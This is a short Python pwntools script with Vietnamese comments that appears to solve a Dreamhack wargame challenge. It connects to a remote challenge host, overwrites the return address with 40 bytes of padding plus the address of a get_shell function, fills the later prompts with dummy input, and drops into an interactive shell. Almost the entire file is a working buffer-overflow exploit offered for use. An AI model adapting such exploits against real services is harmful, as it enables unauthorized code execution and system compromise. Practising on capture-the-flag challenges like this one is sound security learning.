from pwn import *

# p = process("./main")
p = remote("host1.dreamhack.games", 14783)

# Địa chỉ của hàm get_shell (bạn cần tự tìm địa chỉ này nếu nó khác)
# Thường là ngay sau hàm launch_rocket. Dựa vào assembly, nó ở 0x4012e1
get_shell_addr = 0x4012e1

# Xây dựng payload
# 40 bytes đệm (0x20 cho buffer + 0x8 cho RBP)
# Sau đó là địa chỉ của get_shell
payload = b'A' * 40 + p64(get_shell_addr)

# Gửi payload vào "goal address" để gây tràn bộ đệm
p.sendlineafter(b"address > ", payload)

# Gửi dữ liệu giả cho các lần nhập sau
p.sendlineafter(b"number > ", b"0")
p.sendlineafter(b"password > ", b"dummy 0 0")

# Chuyển sang chế độ tương tác để nhận shell
p.interactive()